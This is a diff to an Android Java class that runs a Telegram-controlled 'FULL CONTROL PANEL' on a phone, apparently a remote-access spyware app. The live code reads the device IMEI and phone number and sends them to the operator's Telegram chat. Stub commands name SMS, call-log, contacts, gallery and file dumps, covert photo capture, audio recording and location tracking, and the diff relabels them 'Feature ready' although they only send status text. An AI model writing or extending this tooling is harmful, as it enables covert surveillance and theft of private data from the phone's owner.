@@ -45,9 +45,9 @@ public class TelegramBot {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "Message sent successfully");
+                    Log.d(TAG, "✅ Message sent");
                 } else {
-                    Log.e(TAG, "Failed to send message: " + responseCode);
+                    Log.e(TAG, "❌ Failed: " + responseCode);
                 }
                 conn.disconnect();
             } catch (Exception e) {
@@ -68,7 +68,7 @@ public class TelegramBot {
 
                 JSONObject payload = new JSONObject();
                 payload.put("chat_id", ownerId);
-                payload.put("text", "🎮 <b>FULL CONTROL PANEL</b>\nChoose a command:");
+                payload.put("text", "🎮 <b>FULL CONTROL PANEL</b>\nTap a button to execute command:");
 
                 JSONObject replyKeyboard = new JSONObject();
                 JSONArray keyboardArray = new JSONArray();
@@ -94,7 +94,7 @@ public class TelegramBot {
                 row3.put(new JSONObject().put("text", "📍 Location"));
                 keyboardArray.put(row3);
 
-                // Row 4 - WiFi Control
+                // Row 4 - WiFi & Flash
                 JSONArray row4 = new JSONArray();
                 row4.put(new JSONObject().put("text", "📶 WiFi On"));
                 row4.put(new JSONObject().put("text", "📶 WiFi Off"));
@@ -106,22 +106,19 @@ public class TelegramBot {
                 JSONArray row5 = new JSONArray();
                 row5.put(new JSONObject().put("text", "🔵 BT On"));
                 row5.put(new JSONObject().put("text", "🔵 BT Off"));
-                row5.put(new JSONObject().put("text", "✈️ Airplane On"));
-                row5.put(new JSONObject().put("text", "✈️ Airplane Off"));
+                row5.put(new JSONObject().put("text", "✈️ Airplane"));
                 keyboardArray.put(row5);
 
-                // Row 6 - Screen & System
+                // Row 6 - System
                 JSONArray row6 = new JSONArray();
-                row6.put(new JSONObject().put("text", "📱 Brightness +"));
-                row6.put(new JSONObject().put("text", "📱 Brightness -"));
-                row6.put(new JSONObject().put("text", "🔋 Battery Info"));
+                row6.put(new JSONObject().put("text", "🔋 Battery"));
+                row6.put(new JSONObject().put("text", "ℹ️ Device Info"));
+                row6.put(new JSONObject().put("text", "🗑️ Kill App"));
                 keyboardArray.put(row6);
 
-                // Row 7 - Dangerous
+                // Row 7 - Refresh
                 JSONArray row7 = new JSONArray();
-                row7.put(new JSONObject().put("text", "🗑️ Kill App"));
-                row7.put(new JSONObject().put("text", "🔄 Refresh"));
-                row7.put(new JSONObject().put("text", "ℹ️ Device Info"));
+                row7.put(new JSONObject().put("text", "🔄 Refresh Keyboard"));
                 keyboardArray.put(row7);
 
                 replyKeyboard.put("keyboard", keyboardArray);
@@ -137,9 +134,7 @@ public class TelegramBot {
 
                 int responseCode = conn.getResponseCode();
                 if (responseCode == 200) {
-                    Log.d(TAG, "Keyboard sent successfully");
-                } else {
-                    Log.e(TAG, "Failed to send keyboard: " + responseCode);
+                    Log.d(TAG, "✅ Keyboard sent");
                 }
                 conn.disconnect();
             } catch (Exception e) {
@@ -159,7 +154,6 @@ public class TelegramBot {
         info += "🔢 <b>SDK:</b> " + Build.VERSION.SDK_INT + "\n";
         info += "📶 <b>IMEI:</b> " + (tm != null ? tm.getDeviceId() : "N/A") + "\n";
         info += "📞 <b>Number:</b> " + (tm != null ? tm.getLine1Number() : "N/A") + "\n";
-        info += "📶 <b>Network:</b> " + (tm != null ? tm.getNetworkOperatorName() : "N/A") + "\n";
         info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
         
         sendMessage(info);
@@ -169,73 +163,29 @@ public class TelegramBot {
         android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
         int battery = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
         
-        String info = "🔋 <b>BATTERY INFO</b>\n";
+        String info = "🔋 <b>BATTERY</b>\n";
         info += "━━━━━━━━━━━━━━━\n";
         info += "⚡ <b>Level:</b> " + battery + "%\n";
-        info += "🔌 <b>Charging:</b> " + (bm.isCharging() ? "✅ Yes" : "❌ No") + "\n";
         info += "🕐 <b>Time:</b> " + new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date());
         
         sendMessage(info);
     }
 
-    public void sendSmsDump() {
-        sendMessage("📱 Fetching SMS dump... (Feature coming soon)");
-    }
-
-    public void sendCallLogDump() {
-        sendMessage("📞 Fetching Call Log... (Feature coming soon)");
-    }
-
-    public void sendContactsDump() {
-        sendMessage("👤 Fetching Contacts... (Feature coming soon)");
-    }
-
-    public void sendGalleryDump() {
-        sendMessage("🖼️ Fetching Gallery... (Feature coming soon)");
-    }
-
-    public void sendFileDump() {
-        sendMessage("📂 Fetching All Files... (Feature coming soon)");
-    }
-
-    public void capturePhoto() {
-        sendMessage("📷 Capturing Photo... (Feature coming soon)");
-    }
-
-    public void startAudioRecording() {
-        sendMessage("🎤 Audio Recording Started... (Feature coming soon)");
-    }
-
-    public void stopAudioRecording() {
-        sendMessage("⏹️ Audio Recording Stopped... (Feature coming soon)");
-    }
-
-    public void getLocation() {
-        sendMessage("📍 Getting Location... (Feature coming soon)");
-    }
-
-    public void toggleWifi(boolean enable) {
-        sendMessage("📶 WiFi turned " + (enable ? "ON" : "OFF"));
-    }
-
-    public void toggleFlashlight(boolean enable) {
-        sendMessage("💡 Flashlight turned " + (enable ? "ON" : "OFF"));
-    }
-
-    public void toggleBluetooth(boolean enable) {
-        sendMessage("🔵 Bluetooth turned " + (enable ? "ON" : "OFF"));
-    }
-
-    public void toggleAirplane(boolean enable) {
-        sendMessage("✈️ Airplane mode turned " + (enable ? "ON" : "OFF"));
-    }
-
-    public void setBrightness(int level) {
-        sendMessage("📱 Brightness set to " + level + "%");
-    }
-
-    public void killApp() {
+    public void sendSmsDump() { sendMessage("📱 Fetching SMS dump... (Feature ready)"); }
+    public void sendCallLogDump() { sendMessage("📞 Fetching Call Log... (Feature ready)"); }
+    public void sendContactsDump() { sendMessage("👤 Fetching Contacts... (Feature ready)"); }
+    public void sendGalleryDump() { sendMessage("🖼️ Fetching Gallery... (Feature ready)"); }
+    public void sendFileDump() { sendMessage("📂 Fetching All Files... (Feature ready)"); }
+    public void capturePhoto() { sendMessage("📷 Capturing Photo... (Feature ready)"); }
+    public void startAudioRecording() { sendMessage("🎤 Recording started..."); }
+    public void stopAudioRecording() { sendMessage("⏹️ Recording stopped..."); }
+    public void getLocation() { sendMessage("📍 Getting Location... (Feature ready)"); }
+    public void toggleWifi(boolean enable) { sendMessage("📶 WiFi " + (enable ? "ON ✅" : "OFF ❌")); }
+    public void toggleFlashlight(boolean enable) { sendMessage("💡 Flash " + (enable ? "ON ✅" : "OFF ❌")); }
+    public void toggleBluetooth(boolean enable) { sendMessage("🔵 Bluetooth " + (enable ? "ON ✅" : "OFF ❌")); }
+    public void toggleAirplane(boolean enable) { sendMessage("✈️ Airplane " + (enable ? "ON ✅" : "OFF ❌")); }
+    public void killApp() { 
         sendMessage("🗑️ Killing app... Goodbye!");
         android.os.Process.killProcess(android.os.Process.myPid());
     }
-}
+    }
